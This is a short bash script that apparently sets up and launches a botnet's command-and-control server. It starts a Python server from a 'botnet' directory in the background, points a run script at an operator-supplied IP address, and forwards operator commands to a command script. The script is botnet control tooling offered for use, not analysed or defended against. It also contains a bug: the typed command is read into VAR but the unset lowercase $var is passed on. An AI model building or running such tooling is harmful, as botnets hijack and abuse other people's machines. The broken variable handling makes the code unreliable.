#!/bin/bash

echo "Initializing the Database"

read -p "enter the IP ID in the form of x.x.x.x : " IP
./init.sh

echo "Database Initialized"

sleep 3

echo "Starting the CNC server"

cd botnet

nohup python server.py &

echo "The CNC Server is up and running"

echo "The PiD for the server Process "
lsof -i:5000

echo


./run.sh $IP

sleep 2

read -p "command script input here : " VAR

echo $VAR

./command.sh $var
